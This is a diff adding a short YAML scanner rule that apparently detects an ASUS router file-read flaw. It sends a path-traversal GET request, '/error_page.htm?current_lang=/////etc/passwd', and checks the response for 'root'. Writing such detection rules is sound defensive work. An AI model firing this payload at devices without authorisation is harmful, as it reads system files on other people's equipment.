@@ -1,0 +1,7 @@
+cve-id: asus-route-error-page-fileread
+rules:
+- method: GET
+  path: /error_page.htm?current_lang=/////etc/passwd
+  expression: 'response.body.bcontains(b"root") '
+severity: critical
+type: fileread
